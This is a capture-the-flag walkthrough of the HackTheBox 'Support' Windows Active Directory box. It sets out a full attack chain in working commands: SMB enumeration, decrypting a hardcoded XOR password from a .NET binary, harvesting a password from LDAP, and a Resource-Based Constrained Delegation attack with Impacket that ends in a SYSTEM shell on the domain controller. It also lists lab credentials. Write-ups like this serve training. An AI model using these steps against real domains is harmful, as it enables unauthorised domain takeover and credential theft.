# HackTheBox — Support

**Platform:** HackTheBox  
**Difficulty:** Easy  
**OS:** Windows Server 2022  
**IP:** 10.129.230.181 - [Target IP]

**Domain:** support.htb  
**DC Hostname:** DC  

---

## Summary

Support is an Easy-rated Windows Active Directory box. An anonymous SMB share exposes a custom .NET binary (`UserInfo.exe`) containing an XOR-encrypted LDAP password. Reversing the binary yields credentials for the `ldap` service account. Authenticated LDAP enumeration reveals a plaintext password in the `info` attribute of the `support` user, who is a member of Remote Management Users. The `support` user is part of the Shared Support Accounts group, which has GenericAll over the Domain Controller computer object, enabling a Resource-Based Constrained Delegation (RBCD) attack for full domain compromise.

---

## Reconnaissance

### Nmap

```bash
nmap -p- -sV -sC 10.129.230.181
```

Key open ports:

| Port | Service |
|------|---------|
| 53 | DNS |
| 88 | Kerberos |
| 135 | MS-RPC |
| 139/445 | SMB |
| 389/3268 | LDAP |
| 636/3269 | LDAPS |
| 5985 | WinRM |
| 9389 | AD Web Services |

Nmap identified the domain as `support.htb` and hostname `DC`.

```bash
echo '10.129.230.181 support.htb dc.support.htb' >> /etc/hosts
```

### SMB Enumeration

RPC null sessions and anonymous LDAP binds were both denied. However, SMB anonymous access revealed a non-default share:

```bash
smbclient -L //10.129.230.181 -N
```

```
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
NETLOGON        Disk      Logon server share
support-tools   Disk      support staff tools
SYSVOL          Disk      Logon server share
```

Downloaded all files from `support-tools`:

```bash
smbclient //10.129.230.181/support-tools -N -c 'recurse ON; prompt OFF; mget *'
```

Files included standard utilities (7-Zip, Notepad++, PuTTY, Sysinternals, Wireshark) and one custom file: **UserInfo.exe.zip**.

---

## Foothold

### Reversing UserInfo.exe

```bash
unzip UserInfo.exe.zip -d UserInfo
file UserInfo/UserInfo.exe
```

The binary is a .NET PE32 assembly. Strings revealed references to `getPassword`, `enc_password`, and `LdapQuery`.

```bash
strings UserInfo/UserInfo.exe | grep -i -E 'pass|ldap|bind|cred|key|secret|support|enc'
```

```
getPassword
enc_password
Encoding
LdapQuery
```

Disassembly with `monodis` revealed the `Protected` class containing the decryption logic:

```bash
monodis UserInfo/UserInfo.exe 2>&1 | grep -A 50 "UserInfo.Services.Protected"
```

Key findings in the IL code:

- **Encrypted password (base64):** `0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E`
- **XOR key:** `armando`
- **Algorithm:** `decoded[i] XOR key[i % key.length] XOR 0xDF`
- **LDAP bind user:** `support\ldap`

### Decrypting the Password

```python
python3 -c "
import base64
enc = base64.b64decode('0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E')
key = b'armando'
result = bytes([enc[i] ^ key[i % len(key)] ^ 0xDF for i in range(len(enc))])
print(result.decode())
"
```

**Result:** `nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz`

### Validating Credentials

```bash
crackmapexec smb 10.129.230.181 -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -d support.htb
```

```
SMB  10.129.230.181  445  DC  [+] support.htb\ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

---

## User Flag

### LDAP Enumeration with Credentials

Dumped all users:

```bash
ldapsearch -x -H ldap://10.129.230.181 -D 'support\ldap' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
  -b "DC=support,DC=htb" '(objectClass=user)' sAMAccountName description info comment
```

The `support` user had a password stored in the `info` LDAP attribute:

```
info: Ironside47pleasure40Watchful
```

The `support` user was also a member of:
- **Remote Management Users** — allows WinRM access
- **Shared Support Accounts** — key for privilege escalation

### WinRM Shell

```bash
evil-winrm -i 10.129.230.181 -u support -p 'Ironside47pleasure40Watchful'
```

```powershell
cat C:\Users\support\Desktop\user.txt
# ecabc326fef07bae443db411bd0c7d7e
```

---

## Privilege Escalation

### Enumeration

```powershell
whoami /groups
```

The `support` user is a member of `SUPPORT\Shared Support Accounts` (SID: S-1-5-21-1677581083-3380853377-188903654-1103).

### BloodHound

```bash
bloodhound-python -u support -p 'Ironside47pleasure40Watchful' -d support.htb -ns 10.129.230.181 -c all
```

BloodHound confirmed that the **Shared Support Accounts** group has **GenericAll** over the `DC$` computer object. This allows a Resource-Based Constrained Delegation (RBCD) attack.

### RBCD Attack

**Step 1 — Create a fake machine account:**

```bash
impacket-addcomputer support.htb/support:'Ironside47pleasure40Watchful' \
  -computer-name 'FAKE01$' -computer-pass 'Password123' -dc-ip 10.129.230.181
```

```
[*] Successfully added machine account FAKE01$ with password Password123.
```

**Step 2 — Configure RBCD delegation on DC$:**

```bash
impacket-rbcd support.htb/support:'Ironside47pleasure40Watchful' \
  -delegate-from 'FAKE01$' -delegate-to 'DC$' -action write -dc-ip 10.129.230.181
```

```
[*] Delegation rights modified successfully!
[*] FAKE01$ can now impersonate users on DC$ via S4U2Proxy
```

**Step 3 — Request a service ticket impersonating Administrator:**

```bash
impacket-getST support.htb/'FAKE01$':'Password123' \
  -spn cifs/dc.support.htb -impersonate Administrator -dc-ip 10.129.230.181
```

```
[*] Saving ticket in Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
```

**Step 4 — Use the ticket to get a SYSTEM shell:**

```bash
export KRB5CCNAME=Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
impacket-psexec support.htb/Administrator@dc.support.htb -k -no-pass
```

```powershell
type C:\Users\Administrator\Desktop\root.txt
```

---

## Attack Path Summary

```
Anonymous SMB → support-tools share → UserInfo.exe
    ↓
.NET reversing → XOR-encrypted LDAP password → support\ldap creds
    ↓
Authenticated LDAP → info attribute on support user → plaintext password
    ↓
WinRM as support → user.txt
    ↓
Shared Support Accounts → GenericAll on DC$ → RBCD attack
    ↓
S4U2Proxy → Administrator ticket → SYSTEM shell → root.txt
```

---

## Credentials

| User | Password | Source |
|------|----------|--------|
| support\ldap | nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz | UserInfo.exe (XOR encrypted) |
| support\support | Ironside47pleasure40Watchful | LDAP info attribute |

## Tools Used

- nmap, smbclient, ldapsearch, crackmapexec
- monodis (Mono/.NET disassembler)
- Python (password decryption)
- evil-winrm
- bloodhound-python
- Impacket (addcomputer, rbcd, getST, psexec)
